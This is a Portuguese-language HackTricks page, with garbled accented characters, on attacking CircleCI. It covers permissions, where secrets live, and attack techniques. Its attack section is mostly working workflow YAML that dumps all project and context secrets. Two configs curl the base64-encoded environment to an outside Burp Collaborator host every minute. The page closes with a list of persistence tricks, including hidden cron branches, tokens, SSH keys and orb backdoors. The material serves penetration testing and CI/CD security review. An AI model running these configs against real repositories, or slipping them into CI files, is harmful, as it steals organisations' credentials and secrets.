# Seguran√ßa CircleCI

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Informa√ß√µes B√°sicas

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) √© uma plataforma de Integra√ß√£o Cont√≠nua onde voc√™ pode **definir modelos** indicando o que deseja que seja feito com algum c√≥digo e quando faz√™-lo. Desta forma, voc√™ pode **automatizar testes** ou **implanta√ß√µes** diretamente **da sua branch master do reposit√≥rio**, por exemplo.

## Permiss√µes

**CircleCI** **herda as permiss√µes** do github e bitbucket relacionadas √† **conta** que faz o login.\
Nos meus testes, verifiquei que, desde que voc√™ tenha **permiss√µes de escrita sobre o reposit√≥rio no github**, voc√™ ser√° capaz de **gerenciar as configura√ß√µes do projeto no CircleCI** (definir novas chaves ssh, obter chaves de API do projeto, criar novas branches com novas configura√ß√µes do CircleCI...).

No entanto, voc√™ precisa ser um **admin do reposit√≥rio** para **converter o reposit√≥rio em um projeto CircleCI**.

## Vari√°veis de Ambiente & Segredos

De acordo com [**a documenta√ß√£o**](https://circleci.com/docs/2.0/env-vars/), existem diferentes maneiras de **carregar valores em vari√°veis de ambiente** dentro de um workflow.

### Vari√°veis de ambiente integradas

Todo cont√™iner executado pelo CircleCI sempre ter√° [**vari√°veis de ambiente espec√≠ficas definidas na documenta√ß√£o**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ou `CIRCLE_USERNAME`.

### Texto claro

Voc√™ pode declar√°-las em texto claro dentro de um **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Voc√™ pode declar√°-los em texto claro dentro do **ambiente de execu√ß√£o**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Voc√™ pode declar√°-los em texto claro dentro do **ambiente de build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Voc√™ pode declar√°-los em texto claro dentro do **ambiente de um cont√™iner**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Segredos do Projeto

Estes s√£o **segredos** que s√≥ ser√£o **acess√≠veis** pelo **projeto** (por **qualquer ramo**).\
Voc√™ pode v√™-los **declarados em** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
A funcionalidade "**Importar Vari√°veis**" permite **importar vari√°veis de outros projetos** para este.
{% endhint %}

### Segredos de Contexto

Estes s√£o segredos que s√£o **abrangentes na organiza√ß√£o**. Por **padr√£o, qualquer reposit√≥rio** vai poder **acessar qualquer segredo** armazenado aqui:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
No entanto, note que um grupo diferente (em vez de Todos os membros) pode ser **selecionado para dar acesso aos segredos apenas a pessoas espec√≠ficas**.\
Atualmente, esta √© uma das melhores maneiras de **aumentar a seguran√ßa dos segredos**, para n√£o permitir que todos acessem, mas apenas algumas pessoas.
{% endhint %}

## Ataques

### Procurar Segredos em Texto Claro

Se voc√™ tem **acesso ao VCS** (como github) verifique o arquivo `.circleci/config.yml` de **cada reposit√≥rio em cada ramo** e **procure** por potenciais **segredos em texto claro** armazenados l√°.

### Enumera√ß√£o de Vari√°veis de Ambiente Secretas & Contexto

Verificando o c√≥digo, voc√™ pode encontrar **todos os nomes dos segredos** que est√£o sendo **usados** em cada arquivo `.circleci/config.yml`. Voc√™ tamb√©m pode obter os **nomes dos contextos** desses arquivos ou verific√°-los no console web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrar Segredos do Projeto

{% hint style="warning" %}
Para **exfiltrar TODOS** os segredos do projeto e de contexto, voc√™ **s√≥** precisa ter acesso de **ESCRITA** a **apenas 1 reposit√≥rio** em toda a organiza√ß√£o do github (_e sua conta deve ter acesso aos contextos, mas por padr√£o todos podem acessar todos os contextos_).
{% endhint %}

{% hint style="danger" %}
A funcionalidade "**Importar Vari√°veis**" permite **importar vari√°veis de outros projetos** para este. Portanto, um atacante poderia **importar todas as vari√°veis do projeto de todos os reposit√≥rios** e depois **exfiltrar todas juntas**.
{% endhint %}

Todos os segredos do projeto sempre s√£o definidos no ambiente dos trabalhos, ent√£o apenas chamando env e ofuscando-o em base64 exfiltrar√° os segredos no **console de log de fluxos de trabalho web**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Se voc√™ **n√£o tem acesso ao console web** mas tem **acesso ao reposit√≥rio** e sabe que o CircleCI √© utilizado, voc√™ pode simplesmente **criar um workflow** que √© **acionado a cada minuto** e que **exfiltra os segredos para um endere√ßo externo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Exfiltrar Segredos do Contexto

Voc√™ precisa **especificar o nome do contexto** (isso tamb√©m exfiltrar√° os segredos do projeto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Se voc√™ **n√£o tem acesso ao console web** mas tem **acesso ao reposit√≥rio** e sabe que o CircleCI √© utilizado, voc√™ pode simplesmente **modificar um workflow** que √© **acionado a cada minuto** e que **exfiltra os segredos para um endere√ßo externo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Apenas criar um novo `.circleci/config.yml` em um reposit√≥rio **n√£o √© suficiente para disparar uma constru√ß√£o circleci**. Voc√™ precisa **ativ√°-lo como um projeto no console do circleci**.
{% endhint %}

### Fuga para a Nuvem

**CircleCI** oferece a op√ß√£o de executar **suas constru√ß√µes em suas m√°quinas ou nas suas pr√≥prias**.\
Por padr√£o, as m√°quinas deles est√£o localizadas no GCP, e inicialmente voc√™ n√£o ser√° capaz de encontrar nada relevante. No entanto, se uma v√≠tima estiver executando as tarefas **em suas pr√≥prias m√°quinas (potencialmente, em um ambiente de nuvem)**, voc√™ pode encontrar um **ponto de extremidade de metadados da nuvem com informa√ß√µes interessantes**.

Note que nos exemplos anteriores tudo foi lan√ßado dentro de um cont√™iner docker, mas voc√™ tamb√©m pode **pedir para lan√ßar uma m√°quina VM** (que pode ter diferentes permiss√µes na nuvem):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ou at√© mesmo um cont√™iner docker com acesso a um servi√ßo docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persist√™ncia

* √â poss√≠vel **criar tokens de usu√°rio no CircleCI** para acessar os endpoints da API com o acesso do usu√°rio.
* _https://app.circleci.com/settings/user/tokens_
* √â poss√≠vel **criar tokens de projetos** para acessar o projeto com as permiss√µes dadas ao token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* √â poss√≠vel **adicionar chaves SSH** aos projetos.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* √â poss√≠vel **criar um trabalho cron em um branch oculto** em um projeto inesperado que est√° **vazando** todas as vari√°veis de ambiente do **contexto** todos os dias.
* Ou at√© criar em um branch / modificar um trabalho conhecido que vai **vazar** todos os segredos do contexto e do **projeto** todos os dias.
* Se voc√™ √© um propriet√°rio do github, pode **permitir orbs n√£o verificados** e configurar um em um trabalho como **backdoor**
* Voc√™ pode encontrar uma **vulnerabilidade de inje√ß√£o de comando** em alguma tarefa e **injetar comandos** via um **segredo** modificando seu valor

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
